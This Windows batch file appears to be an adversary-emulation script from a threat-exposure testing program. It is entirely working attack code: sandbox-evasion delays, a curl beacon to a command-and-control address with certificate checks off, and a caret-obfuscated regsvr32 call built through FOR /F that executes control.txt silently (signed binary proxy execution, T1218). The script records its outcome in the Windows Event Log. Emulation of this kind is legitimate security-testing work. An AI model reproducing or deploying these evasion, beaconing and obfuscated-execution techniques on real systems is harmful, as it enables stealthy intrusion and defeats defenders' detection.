@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET bgqkmn=%APPDATA%\8282\508827bf
SET wrdtyh=Macula-Stage0-8282
SET cvfgtp=https://10.0.0.49
SET qazplm=https://10.0.0.49/stage/2/icon.png?8282-7
SET njkbvc=BALAM-S2BO
SET mnbvxc=7
SET poiulk=control.txt
SET lkjhyt=8282

REM Initial delay to evade sandbox analysis - mix methods
timeout /t 55 /nobreak >nul
ping -n 10 127.0.0.1 >nul
CHOICE /C Y /N /D Y /T 8 >nul

REM Heartbeat to C2 - FIRST OPERATION AS REQUESTED - no obfuscation on curl
curl -k -s -o nul "%qazplm%"

REM Mixed delay between operations
ping -n 6 127.0.0.1 >nul
CHOICE /C Y /N /D Y /T 4 >nul

REM Change to output directory
cd /d "%bgqkmn%" 2>nul

REM Random short delay
timeout /t 9 /nobreak >nul

REM Build heavily obfuscated regsvr32 command using caret escapes (T1218 alternative)
SET p1=r^e
SET p2=g^s
SET p3=v^r
SET p4=3^2^.
SET p5=e^x
SET p6=e
SET fullregsvr=%WINDIR%\System32\!p1!!p2!!p3!!p4!!p5!!p6!

REM Fragment DLL path argument with heavy escaping
SET a1=!poiulk!
SET a2= /^s^
SET a3= /^u

REM Execute via FOR /F to further obfuscate command line
SET result=1
SET err_detail=
FOR /F "tokens=*" %%A IN ('echo CALL "!fullregsvr!" "!a1!"!a2!!a3!') DO (
    %%A 2>nul
)
IF NOT !ERRORLEVEL! EQU 0 (
    SET result=0
    SET err_detail=exec_failed_!ERRORLEVEL!
)

REM Random delay with variable calculation
SET /A rdelay=!RANDOM! %% 25 + 15
timeout /t !rdelay! /nobreak >nul
ping -n 5 127.0.0.1 >nul

REM TTP logging via Windows Event Log only (no file writes) - generate random event ID
SET /A evtid=!RANDOM! %% 8000 + 2000
eventcreate /L INFORMATION /SO MaculaCTEM /T SUCCESS /ID !evtid! /D "!njkbvc!: !mnbvxc!-!lkjhyt!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!" >nul 2>nul

REM Final delay before exit
CHOICE /C Y /N /D Y /T 5 >nul